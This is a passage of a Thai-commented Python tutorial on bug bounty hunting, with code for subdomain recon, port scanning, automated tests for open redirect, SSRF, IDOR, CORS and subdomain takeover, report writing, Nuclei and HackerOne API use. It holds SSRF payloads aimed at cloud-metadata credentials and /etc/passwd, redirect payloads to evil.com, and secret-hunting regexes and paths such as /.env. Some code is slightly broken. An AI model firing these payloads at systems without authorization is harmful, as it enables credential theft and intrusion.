# Part 69: Bug Bounty Methodology (Steps 681-690)

## Step 681: Bug Bounty Reconnaissance Framework

```python
import subprocess
import json
import requests
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from pathlib import Path
import concurrent.futures
import time


@dataclass
class Target:
    domain: str
    scope: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    program: str = ''
    platform: str = ''  # hackerone, bugcrowd, intigriti
    

@dataclass  
class ReconResult:
    domain: str
    subdomains: List[str] = field(default_factory=list)
    ips: List[str] = field(default_factory=list)
    open_ports: Dict[str, List[int]] = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    endpoints: List[str] = field(default_factory=list)
    secrets_found: List[str] = field(default_factory=list)


class BugBountyRecon:
    """Automated recon framework สำหรับ bug bounty"""
    
    def __init__(self, target: Target, output_dir: str = '/tmp/recon'):
        self.target = target
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.result = ReconResult(domain=target.domain)
        
    def enumerate_subdomains(self) -> List[str]:
        """หา subdomains ด้วย multiple tools"""
        subdomains = set()
        
        # Subfinder
        print(f"[*] Running Subfinder on {self.target.domain}")
        result = subprocess.run(
            ['subfinder', '-d', self.target.domain, '-silent', '-json'],
            capture_output=True, text=True, timeout=120
        )
        for line in result.stdout.strip().split('\n'):
            if line:
                try:
                    data = json.loads(line)
                    subdomains.add(data.get('host', ''))
                except json.JSONDecodeError:
                    subdomains.add(line.strip())
        
        # Amass (passive)
        print("[*] Running Amass (passive mode)")
        result = subprocess.run(
            ['amass', 'enum', '-passive', '-d', self.target.domain, '-json',
             '-o', str(self.output_dir / 'amass.json')],
            capture_output=True, text=True, timeout=300
        )
        amass_file = self.output_dir / 'amass.json'
        if amass_file.exists():
            for line in amass_file.read_text().split('\n'):
                if line:
                    try:
                        data = json.loads(line)
                        subdomains.add(data.get('name', ''))
                    except json.JSONDecodeError:
                        pass
        
        # crt.sh (certificate transparency)
        print("[*] Checking crt.sh...")
        crt_subs = self._crtsh_search(self.target.domain)
        subdomains.update(crt_subs)
        
        # Assetfinder
        result = subprocess.run(
            ['assetfinder', '--subs-only', self.target.domain],
            capture_output=True, text=True, timeout=60
        )
        for line in result.stdout.strip().split('\n'):
            if line.strip():
                subdomains.add(line.strip())
        
        # กรองเฉพาะ in-scope
        valid_subs = [
            s for s in subdomains
            if s and self._is_in_scope(s)
        ]
        
        self.result.subdomains = sorted(valid_subs)
        print(f"[+] Found {len(valid_subs)} in-scope subdomains")
        
        return self.result.subdomains
    
    def _crtsh_search(self, domain: str) -> Set[str]:
        """Certificate transparency log search"""
        subdomains = set()
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(url, timeout=30)
            response.raise_for_status()
            
            for entry in response.json():
                name = entry.get('name_value', '')
                # Handle wildcard and multi-SAN certs
                for sub in name.split('\n'):
                    sub = sub.strip().lstrip('*.')
                    if sub.endswith(domain):
                        subdomains.add(sub)
        except Exception as e:
            print(f"  [!] crt.sh error: {e}")
        
        return subdomains
    
    def _is_in_scope(self, host: str) -> bool:
        """ตรวจสอบว่า host อยู่ใน scope"""
        # Check out of scope first
        for oos in self.target.out_of_scope:
            if host.endswith(oos) or host == oos:
                return False
        
        # Check in scope
        if not self.target.scope:
            return host.endswith(self.target.domain)
        
        for scope in self.target.scope:
            if scope.startswith('*.'):
                if host.endswith(scope[2:]):
                    return True
            elif host == scope or host.endswith('.' + scope):
                return True
        
        return False
    
    def probe_alive_hosts(self, subdomains: List[str] = None) -> List[str]:
        """ตรวจสอบว่า host ไหนยัง active"""
        hosts = subdomains or self.result.subdomains
        
        if not hosts:
            return []
        
        # เขียน hosts ลงไฟล์
        hosts_file = self.output_dir / 'subdomains.txt'
        hosts_file.write_text('\n'.join(hosts))
        
        # httpx สำหรับ probe HTTP/HTTPS
        print(f"[*] Probing {len(hosts)} hosts with httpx...")
        result = subprocess.run(
            ['httpx', '-l', str(hosts_file), '-json', '-silent',
             '-tech-detect', '-status-code', '-title', '-web-server',
             '-no-color'],
            capture_output=True, text=True, timeout=300
        )
        
        alive = []
        for line in result.stdout.strip().split('\n'):
            if line:
                try:
                    data = json.loads(line)
                    host_url = data.get('url', '')
                    if host_url:
                        alive.append(host_url)
                        # เก็บ technologies
                        techs = data.get('technologies', [])
                        self.result.technologies.extend(techs)
                except json.JSONDecodeError:
                    pass
        
        print(f"[+] Found {len(alive)} alive hosts")
        return alive
    
    def scan_ports(self, hosts: List[str]) -> Dict[str, List[int]]:
        """สแกน ports กับ nmap"""
        open_ports = {}
        
        # Top 1000 ports
        ips_file = self.output_dir / 'ips.txt'
        ips_file.write_text('\n'.join(hosts))
        
        print(f"[*] Port scanning {len(hosts)} hosts...")
        result = subprocess.run(
            ['nmap', '-iL', str(ips_file), '--top-ports', '1000',
             '-T4', '--open', '-oJ', str(self.output_dir / 'nmap.json')],
            capture_output=True, text=True, timeout=600
        )
        
        nmap_file = self.output_dir / 'nmap.json'
        if nmap_file.exists():
            try:
                nmap_data = json.loads(nmap_file.read_text())
                for host_data in nmap_data.get('hosts', []):
                    ip = host_data.get('ip', '')
                    ports = [
                        p['port'] for p in host_data.get('ports', [])
                        if p.get('state') == 'open'
                    ]
                    if ports:
                        open_ports[ip] = ports
            except json.JSONDecodeError:
                pass
        
        self.result.open_ports = open_ports
        return open_ports
    
    def crawl_endpoints(self, urls: List[str]) -> List[str]:
        """ครอลหา endpoints"""
        endpoints = set()
        
        for url in urls[:10]:  # Limit เพื่อไม่ให้เสียเวลานาน
            # Waybackurls
            domain = url.replace('https://', '').replace('http://', '').split('/')[0]
            result = subprocess.run(
                ['waybackurls', domain],
                capture_output=True, text=True, timeout=60
            )
            for line in result.stdout.strip().split('\n'):
                if line and self._is_in_scope(domain):
                    endpoints.add(line.strip())
            
            # Katana (active crawler)
            result = subprocess.run(
                ['katana', '-u', url, '-d', '3', '-silent', '-jc'],
                capture_output=True, text=True, timeout=120
            )
            for line in result.stdout.strip().split('\n'):
                if line.strip():
                    endpoints.add(line.strip())
        
        self.result.endpoints = list(endpoints)
        return self.result.endpoints
    
    def find_exposed_secrets(self, urls: List[str]) -> List[str]:
        """หา secrets ที่เปิดเผย"""
        secrets = []
        
        secret_patterns = {
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret': r'[0-9a-zA-Z/+]{40}',
            'GitHub Token': r'gh[pousr]_[A-Za-z0-9_]{36,255}',
            'Google API': r'AIza[0-9A-Za-z-_]{35}',
            'Slack Token': r'xox[baprs]-[0-9a-zA-Z-]+',
            'JWT': r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*',
            'Private Key': r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----',
            'API Key Generic': r'(?i)(api[_-]?key|apikey|api_secret)["\']?\s*[:=]\s*["\']?([A-Za-z0-9-_]{16,64})'
        }
        
        interesting_paths = [
            '/.git/config', '/.env', '/config.js', '/config.json',
            '/swagger.json', '/api/swagger.json', '/v1/swagger.json',
            '/api-docs', '/graphql', '/.well-known/security.txt',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/test.php'
        ]
        
        for url in urls[:20]:
            for path in interesting_paths:
                full_url = url.rstrip('/') + path
                try:
                    response = requests.get(
                        full_url, timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0'},
                        allow_redirects=False
                    )
                    
                    if response.status_code in (200, 301, 302):
                        content = response.text
                        
                        for secret_type, pattern in secret_patterns.items():
                            matches = re.findall(pattern, content)
                            if matches:
                                secrets.append(f"{full_url}: {secret_type} found")
                                
                except Exception:
                    pass
        
        self.result.secrets_found = secrets
        return secrets
    
    def generate_recon_report(self) -> Dict:
        """สร้าง recon report"""
        return {
            'target': self.target.domain,
            'program': self.target.program,
            'platform': self.target.platform,
            'subdomains_count': len(self.result.subdomains),
            'alive_hosts': len(self.result.endpoints),
            'technologies': list(set(self.result.technologies)),
            'open_ports_count': sum(len(p) for p in self.result.open_ports.values()),
            'endpoints_count': len(self.result.endpoints),
            'secrets_found': len(self.result.secrets_found),
            'secrets': self.result.secrets_found,
            'attack_surface': {
                'subdomains': self.result.subdomains[:20],
                'interesting_endpoints': [
                    e for e in self.result.endpoints
                    if any(k in e for k in ['admin', 'api', 'upload', 'login', 'auth', 'config'])
                ][:20]
            }
        }
```

## Step 682: Vulnerability Assessment Automation

```python
import requests
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlencode
import re


@dataclass
class BugReport:
    title: str
    severity: str  # critical, high, medium, low, informational
    cvss_score: float
    vulnerability_type: str
    endpoint: str
    parameter: Optional[str]
    proof_of_concept: str
    impact: str
    remediation: str
    bounty_estimate: str = ''


class VulnerabilityScanner:
    """Automated vulnerability scanner สำหรับ bug bounty"""
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.bugs: List[BugReport] = []
        
    def test_open_redirect(self, endpoints: List[str]) -> List[BugReport]:
        """ตรวจหา Open Redirect"""
        bugs = []
        
        payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            '///evil.com/%2F..',
            'https:evil.com',
            '/%2Fevil.com',
            '//.evil.com',
        ]
        
        redirect_params = [
            'redirect', 'url', 'return', 'returnto', 'returnurl',
            'next', 'goto', 'destination', 'redir', 'target'
        ]
        
        for endpoint in endpoints:
            for param in redirect_params:
                for payload in payloads:
                    test_url = f"{endpoint}?{param}={payload}"
                    try:
                        response = self.session.get(
                            test_url, timeout=10,
                            allow_redirects=False
                        )
                        
                        location = response.headers.get('Location', '')
                        if response.status_code in (301, 302, 303, 307, 308):
                            if 'evil.com' in location:
                                bugs.append(BugReport(
                                    title='Open Redirect',
                                    severity='medium',
                                    cvss_score=6.1,
                                    vulnerability_type='CWE-601',
                                    endpoint=endpoint,
                                    parameter=param,
                                    proof_of_concept=f"GET {test_url}\nLocation: {location}",
                                    impact='Redirect users to malicious sites, phishing attacks',
                                    remediation='Whitelist allowed redirect domains',
                                    bounty_estimate='$200-$500'
                                ))
                    except Exception:
                        pass
        
        return bugs
    
    def test_ssrf(self, endpoints: List[str]) -> List[BugReport]:
        """ตรวจหา SSRF vulnerabilities"""
        bugs = []
        
        # ใช้ Burp Collaborator-style callback
        callback_domain = 'your-callback.burpcollaborator.net'
        
        ssrf_params = [
            'url', 'uri', 'path', 'dest', 'redirect', 'request',
            'fetch', 'src', 'source', 'image', 'load', 'webhook',
            'callback', 'proxy', 'mirror'
        ]
        
        ssrf_payloads = [
            f'http://{callback_domain}',
            'http://169.254.169.254/latest/meta-data/',  # AWS IMDS
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/instance',  # Azure
            'http://localhost:22',  # Port scan
            'http://internal-service:8080',
            'file:///etc/passwd',  # LFI via SSRF
            'dict://localhost:11211/stat',  # Memcached
        ]
        
        for endpoint in endpoints:
            for param in ssrf_params:
                for payload in ssrf_payloads[:3]:  # ทดสอบ payloads สำคัญก่อน
                    test_url = f"{endpoint}?{param}={payload}"
                    try:
                        response = self.session.get(
                            test_url, timeout=10
                        )
                        
                        # ตรวจหา indicators ของ SSRF
                        content = response.text
                        ssrf_indicators = [
                            'ami-id', 'instance-id', 'iam/security-credentials',  # AWS
                            'computeMetadata', 'serviceAccountEmail',  # GCP
                            '169.254.169.254',  # IMDS
                            'root:x:0:0',  # /etc/passwd
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in content:
                                severity = 'critical' if 'credentials' in content else 'high'
                                bugs.append(BugReport(
                                    title=f'Server-Side Request Forgery (SSRF) - {indicator}',
                                    severity=severity,
                                    cvss_score=9.1 if severity == 'critical' else 7.3,
                                    vulnerability_type='CWE-918',
                                    endpoint=endpoint,
                                    parameter=param,
                                    proof_of_concept=f"GET {test_url}\nResponse contains: {indicator}",
                                    impact='Access to internal services, cloud metadata, potential RCE',
                                    remediation='Whitelist allowed URLs, disable SSRF protocols',
                                    bounty_estimate='$2000-$20000'
                                ))
                    except Exception:
                        pass
        
        return bugs
    
    def test_idor(self, endpoints: List[str]) -> List[BugReport]:
        """ตรวจหา Insecure Direct Object Reference (IDOR)"""
        bugs = []
        
        # พาเทิร์น endpoint ที่มี ID
        id_pattern = re.compile(r'/(\d+|[a-f0-9-]{36})(/|$|\?)')
        
        for endpoint in endpoints:
            if not id_pattern.search(endpoint):
                continue
            
            # ลองเปลี่ยน ID
            def test_id(url: str, new_id: str) -> Optional[requests.Response]:
                modified_url = id_pattern.sub(
                    lambda m: m.group(0).replace(m.group(1), new_id),
                    url
                )
                try:
                    return self.session.get(modified_url, timeout=10)
                except Exception:
                    return None
            
            # ดึง response ของ current user
            try:
                original_response = self.session.get(endpoint, timeout=10)
                original_status = original_response.status_code
            except Exception:
                continue
            
            # Test ด้วย IDs อื่น
            test_ids = ['1', '2', '100', '999', 'admin', '0']
            
            for test_id_value in test_ids:
                response = test_id(endpoint, test_id_value)
                if response and response.status_code == 200:
                    # ตรวจสอปว่าได้ข้อมูลที่ไม่ควรได้
                    if len(response.text) > 100 and response.text != original_response.text:
                        bugs.append(BugReport(
                            title='Insecure Direct Object Reference (IDOR)',
                            severity='high',
                            cvss_score=7.5,
                            vulnerability_type='CWE-639',
                            endpoint=endpoint,
                            parameter='id',
                            proof_of_concept=f"Access {endpoint.replace(id_pattern.search(endpoint).group(1), test_id_value)} returns 200",
                            impact='Access other users\' private data',
                            remediation='Implement proper authorization checks',
                            bounty_estimate='$500-$5000'
                        ))
                        break
        
        return bugs
    
    def test_subdomain_takeover(self, subdomains: List[str]) -> List[BugReport]:
        """ตรวจหา subdomain takeover"""
        bugs = []
        
        # Fingerprints สำหรับ services ที่ vulnerable
        takeover_fingerprints = {
            'GitHub Pages': {
                'cname': 'github.io',
                'fingerprint': 'There isn\'t a GitHub Pages site here',
                'severity': 'high'
            },
            'AWS S3': {
                'cname': 's3.amazonaws.com',
                'fingerprint': 'NoSuchBucket',
                'severity': 'high'
            },
            'Heroku': {
                'cname': 'herokudns.com',
                'fingerprint': 'No such app',
                'severity': 'high'
            },
            'Shopify': {
                'cname': 'myshopify.com',
                'fingerprint': 'Sorry, this shop is currently unavailable',
                'severity': 'medium'
            },
            'Azure': {
                'cname': 'azurewebsites.net',
                'fingerprint': 'Error 404 - Web app not found',
                'severity': 'high'
            },
            'Fastly': {
                'cname': 'fastly.net',
                'fingerprint': 'Fastly error: unknown domain',
                'severity': 'high'
            }
        }
        
        for subdomain in subdomains:
            # ตรวจสอบ CNAME
            cname = self._get_cname(subdomain)
            
            for service, data in takeover_fingerprints.items():
                if data['cname'] in cname:
                    # ตรวจ fingerprint
                    try:
                        response = requests.get(
                            f'https://{subdomain}', timeout=10,
                            allow_redirects=True
                        )
                        if data['fingerprint'].lower() in response.text.lower():
                            bugs.append(BugReport(
                                title=f'Subdomain Takeover via {service}',
                                severity=data['severity'],
                                cvss_score=8.1 if data['severity'] == 'high' else 5.4,
                                vulnerability_type='CWE-350',
                                endpoint=subdomain,
                                parameter=None,
                                proof_of_concept=f"{subdomain} CNAME -> {cname}\nFingerprint: {data['fingerprint']}",
                                impact='Host malicious content on trusted domain, cookie theft',
                                remediation=f'Remove dangling CNAME record or reclaim {service} resource',
                                bounty_estimate='$500-$5000'
                            ))
                    except Exception:
                        pass
        
        return bugs
    
    def _get_cname(self, hostname: str) -> str:
        """Get CNAME record"""
        try:
            import socket
            result = subprocess.run(
                ['dig', '+short', 'CNAME', hostname],
                capture_output=True, text=True, timeout=10
            )
            return result.stdout.strip()
        except Exception:
            return ''
    
    def test_cors_misconfiguration(self, endpoints: List[str]) -> List[BugReport]:
        """ตรวจหา CORS misconfigurations"""
        bugs = []
        
        origin_payloads = [
            'https://evil.com',
            'https://target.evil.com',
            'null',
            'https://attacker.com',
        ]
        
        for endpoint in endpoints:
            for origin in origin_payloads:
                try:
                    response = self.session.get(
                        endpoint,
                        headers={'Origin': origin},
                        timeout=10
                    )
                    
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    
                    # Critical: reflects origin with credentials
                    if (acao == origin or acao == '*') and acac.lower() == 'true':
                        severity = 'high'
                        if acao == origin:
                            severity = 'critical'
                        
                        bugs.append(BugReport(
                            title='CORS Misconfiguration - Credentials Exposed',
                            severity=severity,
                            cvss_score=8.8 if severity == 'critical' else 6.5,
                            vulnerability_type='CWE-942',
                            endpoint=endpoint,
                            parameter='Origin header',
                            proof_of_concept=f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                            impact='Cross-origin data theft, account takeover',
                            remediation='Whitelist specific origins, never use wildcard with credentials',
                            bounty_estimate='$500-$3000'
                        ))
                except Exception:
                    pass
        
        return bugs
```

## Step 683: Bug Report Writing Automation

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
from datetime import datetime
import json


class BugReportGenerator:
    """สร้าง professional bug reports สำหรับ bug bounty platforms"""
    
    CVSS_VECTORS = {
        'critical': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
        'high': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
        'medium': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N',
        'low': 'CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N'
    }
    
    def generate_hackerone_report(self, bug: BugReport) -> str:
        """สร้าง report สำหรับ HackerOne"""
        template = f"""## Summary

{bug.title} was found at `{bug.endpoint}`. {self._get_summary_description(bug)}

## Description

**Vulnerability Type:** {bug.vulnerability_type}  
**Severity:** {bug.severity.upper()}  
**CVSS Score:** {bug.cvss_score} ({self.CVSS_VECTORS.get(bug.severity, 'N/A')})

{self._get_detailed_description(bug)}

## Steps to Reproduce

{self._get_reproduction_steps(bug)}

## Proof of Concept

```
{bug.proof_of_concept}
```

## Impact

{bug.impact}

**What an attacker can do:**
{self._get_attacker_capabilities(bug)}

## Recommended Remediation

{bug.remediation}

## References

{self._get_references(bug)}
"""
        return template
    
    def _get_summary_description(self, bug: BugReport) -> str:
        descriptions = {
            'Open Redirect': 'An attacker can craft malicious links that redirect users to arbitrary external URLs.',
            'SSRF': 'An attacker can make the server perform requests to internal services or external URLs.',
            'IDOR': 'An attacker can access resources belonging to other users by modifying object identifiers.',
            'CORS Misconfiguration - Credentials Exposed': 'Cross-origin requests with credentials are allowed from arbitrary origins.',
            'Subdomain Takeover': 'The subdomain points to an unclaimed external resource that can be claimed by an attacker.',
        }
        return descriptions.get(bug.title, 'This vulnerability allows an attacker to compromise the security of the application.')
    
    def _get_detailed_description(self, bug: BugReport) -> str:
        return f"""
The endpoint `{bug.endpoint}` {f'parameter `{bug.parameter}`' if bug.parameter else ''} 
was found to be vulnerable to {bug.title}.

This vulnerability has a CVSS score of **{bug.cvss_score}**, indicating a {bug.severity} severity issue.
The vulnerability falls under {bug.vulnerability_type}.
"""
    
    def _get_reproduction_steps(self, bug: BugReport) -> str:
        vtype = bug.vulnerability_type
        
        steps_map = {
            'CWE-601': f"""1. Navigate to: `{bug.endpoint}`
2. Observe the `{bug.parameter}` parameter in the request
3. Modify the parameter value to: `https://evil.com`
4. Observe that the server redirects to the attacker-controlled domain
5. Victims following this link will be sent to the malicious site""",
            'CWE-918': f"""1. Send the following request:
```
GET {bug.endpoint}?{bug.parameter}=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
```
2. Observe the response contains AWS metadata
3. Access IAM credentials at: `?{bug.parameter}=http://169.254.169.254/latest/meta-data/iam/security-credentials/`""",
            'CWE-639': f"""1. Log in as User A
2. Access: `{bug.endpoint}` (note your user ID)
3. Modify the ID in the URL to belong to User B
4. Observe that User B's data is returned
5. Data enumeration is possible by incrementing the ID""",
        }
        
        return steps_map.get(vtype, f"""1. Send the following request:
```
{bug.proof_of_concept}
```
2. Observe the vulnerable response""")
    
    def _get_attacker_capabilities(self, bug: BugReport) -> str:
        capabilities_map = {
            'Open Redirect': '- Phishing attacks using trusted domain\n- Credential harvesting via fake login pages\n- OAuth token theft',
            'SSRF': '- Access internal services (databases, admin panels)\n- Steal cloud credentials (AWS/GCP/Azure)\n- Potential Remote Code Execution\n- Scan internal network',
            'IDOR': '- Access private user data\n- Modify/delete other users\' resources\n- Account takeover if email/password exposed',
            'CORS Misconfiguration - Credentials Exposed': '- Steal authenticated user data from any origin\n- Perform authenticated actions on behalf of victims\n- Full account takeover',
        }
        return capabilities_map.get(bug.title, '- Compromise application security\n- Data exfiltration\n- Unauthorized access')
    
    def _get_references(self, bug: BugReport) -> str:
        refs_map = {
            'CWE-601': '- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect\n- https://cwe.mitre.org/data/definitions/601.html',
            'CWE-918': '- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n- https://portswigger.net/web-security/ssrf\n- https://cwe.mitre.org/data/definitions/918.html',
            'CWE-639': '- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References\n- https://cwe.mitre.org/data/definitions/639.html',
        }
        return refs_map.get(bug.vulnerability_type, f'- https://cwe.mitre.org/data/definitions/{bug.vulnerability_type.replace("CWE-", "")}.html')
    
    def calculate_bounty_estimate(self, bug: BugReport, program_type: str = 'normal') -> Dict:
        """ประมาณ bounty"""
        base_ranges = {
            'critical': (5000, 50000),
            'high': (1000, 10000),
            'medium': (200, 2000),
            'low': (50, 500),
            'informational': (0, 100)
        }
        
        multipliers = {
            'vdp': 0,  # Vulnerability Disclosure Program (no bounty)
            'normal': 1,
            'high_reward': 2,
            'enterprise': 3
        }
        
        base_min, base_max = base_ranges.get(bug.severity, (0, 0))
        multiplier = multipliers.get(program_type, 1)
        
        return {
            'minimum': base_min * multiplier,
            'maximum': base_max * multiplier,
            'typical': int((base_min + base_max) / 2 * multiplier),
            'currency': 'USD'
        }
```

## Step 684: Automated Scanning with Nuclei

```python
import subprocess
import json
import os
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional


@dataclass
class NucleiResult:
    template_id: str
    template_name: str
    severity: str
    host: str
    matched_at: str
    extracted_results: List[str] = field(default_factory=list)
    curl_command: str = ''


class NucleiScanner:
    """ใช้ Nuclei สำหรับ vulnerability scanning"""
    
    def __init__(self, output_dir: str = '/tmp/nuclei'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
    def update_templates(self):
        """Update Nuclei templates"""
        subprocess.run(
            ['nuclei', '-update-templates'],
            capture_output=True, text=True
        )
        print("[+] Nuclei templates updated")
    
    def scan_target(self, target: str, templates: List[str] = None, 
                    severity: str = None, timeout: int = 300) -> List[NucleiResult]:
        """สแกน target ด้วย Nuclei"""
        output_file = self.output_dir / f'nuclei_{target.replace("/","_").replace(":","")}.json'
        
        cmd = [
            'nuclei',
            '-target', target,
            '-json-export', str(output_file),
            '-silent',
            '-no-color',
            '-timeout', '10',
            '-retries', '2',
            '-rate-limit', '150',
        ]
        
        # เพิ่ม template specifications
        if templates:
            for t in templates:
                cmd.extend(['-t', t])
        else:
            # Default: cves, exposed-panels, vulnerabilities
            cmd.extend(['-t', 'cves', '-t', 'exposures', '-t', 'vulnerabilities'])
        
        if severity:
            cmd.extend(['-severity', severity])
        
        print(f"[*] Scanning {target} with Nuclei...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        # Parse results
        findings = []
        if output_file.exists():
            for line in output_file.read_text().strip().split('\n'):
                if line:
                    try:
                        data = json.loads(line)
                        info = data.get('info', {})
                        findings.append(NucleiResult(
                            template_id=data.get('template-id', ''),
                            template_name=info.get('name', ''),
                            severity=info.get('severity', 'unknown'),
                            host=data.get('host', ''),
                            matched_at=data.get('matched-at', ''),
                            extracted_results=data.get('extracted-results', []),
                            curl_command=data.get('curl-command', '')
                        ))
                    except json.JSONDecodeError:
                        pass
        
        print(f"[+] Found {len(findings)} vulnerabilities")
        return findings
    
    def scan_multiple_targets(self, targets: List[str], 
                               severity_threshold: str = 'medium') -> List[NucleiResult]:
        """Scan multiple targets"""
        # เขียน targets ลงไฟล์
        targets_file = self.output_dir / 'targets.txt'
        targets_file.write_text('\n'.join(targets))
        
        output_file = self.output_dir / 'nuclei_bulk.json'
        
        cmd = [
            'nuclei',
            '-l', str(targets_file),
            '-json-export', str(output_file),
            '-t', 'cves',
            '-t', 'exposures/configs',
            '-t', 'exposures/tokens',
            '-t', 'vulnerabilities',
            '-t', 'misconfiguration',
            '-severity', severity_threshold,
            '-silent',
            '-no-color',
            '-rate-limit', '100',
            '-bulk-size', '25',
            '-concurrency', '25',
        ]
        
        subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
        
        findings = []
        if output_file.exists():
            for line in output_file.read_text().strip().split('\n'):
                if line:
                    try:
                        data = json.loads(line)
                        info = data.get('info', {})
                        findings.append(NucleiResult(
                            template_id=data.get('template-id', ''),
                            template_name=info.get('name', ''),
                            severity=info.get('severity', 'unknown'),
                            host=data.get('host', ''),
                            matched_at=data.get('matched-at', ''),
                        ))
                    except json.JSONDecodeError:
                        pass
        
        return findings
    
    def create_custom_template(self, template_data: Dict) -> str:
        """สร้าง custom Nuclei template"""
        import yaml
        
        template = {
            'id': template_data['id'],
            'info': {
                'name': template_data['name'],
                'author': template_data.get('author', 'custom'),
                'severity': template_data.get('severity', 'medium'),
                'description': template_data.get('description', ''),
                'tags': template_data.get('tags', ['custom'])
            },
            'requests': [
                {
                    'method': template_data.get('method', 'GET'),
                    'path': template_data.get('paths', ['{{BaseURL}}']),
                    'headers': template_data.get('headers', {}),
                    'matchers-condition': 'and',
                    'matchers': template_data.get('matchers', [
                        {
                            'type': 'status',
                            'status': [200]
                        }
                    ]),
                    'extractors': template_data.get('extractors', [])
                }
            ]
        }
        
        template_path = self.output_dir / f"{template_data['id']}.yaml"
        with open(template_path, 'w') as f:
            yaml.dump(template, f, default_flow_style=False)
        
        return str(template_path)
```

## Step 685: HackerOne/Bugcrowd API Integration

```python
import requests
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime


class HackerOneAPI:
    """HackerOne API client สำหรับจัดการ bug reports"""
    
    BASE_URL = 'https://api.hackerone.com/v1'
    
    def __init__(self, username: str, token: str):
        self.session = requests.Session()
        self.session.auth = (username, token)
        self.session.headers.update({'Accept': 'application/json'})
    
    def get_programs(self, page: int = 1) -> List[Dict]:
        """ดึงรายชื่อ bug bounty programs"""
        response = self.session.get(
            f'{self.BASE_URL}/hackers/programs',
            params={'page[number]': page, 'page[size]': 25}
        )
        response.raise_for_status()
        return response.json().get('data', [])
    
    def get_program_scope(self, program_handle: str) -> Dict:
        """ดึง scope ของ program"""
        response = self.session.get(
            f'{self.BASE_URL}/programs/{program_handle}'
        )
        response.raise_for_status()
        data = response.json().get('data', {})
        
        scope = {
            'in_scope': [],
            'out_of_scope': []
        }
        
        for relationship in data.get('relationships', {}).get('structured_scopes', {}).get('data', []):
            asset_type = relationship.get('attributes', {}).get('asset_type', '')
            asset_identifier = relationship.get('attributes', {}).get('asset_identifier', '')
            eligible_for_bounty = relationship.get('attributes', {}).get('eligible_for_bounty', False)
            
            if relationship.get('attributes', {}).get('eligible_for_submission', True):
                scope['in_scope'].append({
                    'type': asset_type,
                    'identifier': asset_identifier,
                    'bounty': eligible_for_bounty
                })
            else:
                scope['out_of_scope'].append(asset_identifier)
        
        return scope
    
    def submit_report(self, program_handle: str, report_data: Dict) -> Dict:
        """ส่ง bug report"""
        payload = {
            'data': {
                'type': 'report',
                'attributes': {
                    'title': report_data['title'],
                    'vulnerability_information': report_data['description'],
                    'severity_rating': report_data.get('severity', 'medium'),
                    'impact': report_data.get('impact', ''),
                    'weakness_id': report_data.get('weakness_id'),
                },
                'relationships': {
                    'program': {
                        'data': {
                            'type': 'program',
                            'id': program_handle
                        }
                    }
                }
            }
        }
        
        response = self.session.post(
            f'{self.BASE_URL}/reports',
            json=payload
        )
        response.raise_for_status()
        return response.json()
    
    def get_my_reports(self, state: str = None) -> List[Dict]:
        """ดึง reports ที่ส่งไปแล้ว"""
        params = {'page[size]': 25}
        if state:
            params['filter[state][]'] = state  # new, pending-program-review, triaged, etc.
        
        response = self.session.get(
            f'{self.BASE_URL}/reports',
            params=params
        )
        response.raise_for_status()
        return response.json().get('data', [])
    
    def analyze_program_stats(self, program_handle: str) -> Dict:
        """วิเคราะห์สถิติของ program"""
        response = self.session.get(
            f'{self.BASE_URL}/programs/{program_handle}'
        )
        response.raise_for_status()
        data = response.json().get('data', {}).get('attributes', {})
        
        return {
            'name': data.get('name', ''),
            'handle': data.get('handle', ''),
            'average_bounty': data.get('average_bounty', {}).get('value', 0),
            'top_bounty': data.get('top_bounty', {}).get('value', 0),
            'total_bounties_paid': data.get('total_bounties_paid_prefix', 0),
            'reports_received': data.get('number_of_reports_for_user', 0),
            'response_efficiency': data.get('response_efficiency_percentage', 0),
            'avg_time_to_first_response': data.get('most_recent_sla_snapshot', {}).get('average_time_to_first_program_response', 0),
        }


class BugBountyTracker:
    """ติดตามสถานะ bug bounty hunting"""
    
    def __init__(self):
        self.reports = []
        self.earnings = []
        
    def track_report(self, report_id: str, program: str, 
                     title: str, severity: str, 
                     status: str = 'submitted') -> Dict:
